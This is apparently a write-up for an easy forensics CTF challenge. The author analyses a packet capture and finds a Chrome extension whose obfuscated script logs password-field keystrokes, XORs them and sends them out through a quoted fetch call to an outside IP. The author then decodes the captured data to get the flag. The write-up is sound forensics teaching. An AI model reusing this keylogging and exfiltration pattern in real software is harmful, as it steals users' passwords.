# X-tension 

| Category   | Difficulty |
|:----------:|:----------:|
| Forensics  | Easy       |

## Challenge Description
Trying to get good at something while watching youtube isn't the greatest idea...

## Attachment(s)
[chal.pcapng](https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/blob/main/Forensics/x-tension/dist/chal.pcapng)

***

## Walkthrough
Given that we have a PCAP (packet capture) file, I used [Wireshark](https://www.wireshark.org/) to start analyzing the captured network traffic.

When analyzing PCAP files using Wireshark, it is helpful to look at the **Statistics** menu, which provides high-level statistics of the network traffic (protocols, host addresses, etc.) Documentation on Wireshark statistics can be found [here](https://www.wireshark.org/docs/wsug_html_chunked/ChStatistics.html).

I started looking at the HTTP web requests, found under **Statistics > HTTP > Requests**. This shows a list of all HTTP requests by destination address along with what was requested. 

*[Image: HTTP requests]*

We have two interesting findings:
* FunnyCatPicsExtension.crx (Google Chrome extension)
* Seemingly encrypted requests to a suspicous IP

<br> **Examining the CRX file:** <br>
 I exported the the CRX file from the PCAP (**File > Export Objects > HTTP** then select the file you want to Save) but the file type couldn't be directly opened in Kali Linux. I used [CRX Extractor](https://crxextractor.com/) to convert the CRX file to a ZIP to dig into the contents.

*[Image: CRX to ZIP]*

 The **contents.js** file is heavily objuscated code with this interesting snippet: `fetch('http://192.9.137.137:42552/?t=` which relates to the other HTTP requests found before.

Admittedly I copy/pasted this code into Google Gemini to understand what it does, and had the following takeaways:
* This file _listens to keystrokes if the event's target element is an input field with the type attribute set to 'password'_
* The captured keystroke is _encrypted using a simple XOR cipher, then URL-encoded before being sent to the remote IP via the query paramter t_

<br> **Pivoting back to Wireshark:** <br>
Knowing that we have passwords being exfilttrated via web requests, I went back to Wireshark to find the relevant packets. Using the display filter **http.request.method=="GET"** lists the GET requests (or keystrokes) in order.

*[Image: GET requests]*

<br> **Decrypting the data:** <br>
Now we have the exfiltrated keystrokes in order: 5e 54 43 51 4c 52 4f 43 52 59 44 5e 58 59 44 68 5a 5e 50 5f 43 68 5d 42 44 43 68 44 42 54 5c 4a

I used [CyberChef](https://gchq.github.io/CyberChef/) to decrypt the keystrokes and got the flag using the recipe **From Hex > XOR Brute Force** which resulted in the flag. 

Challenge solved! :sunglasses:
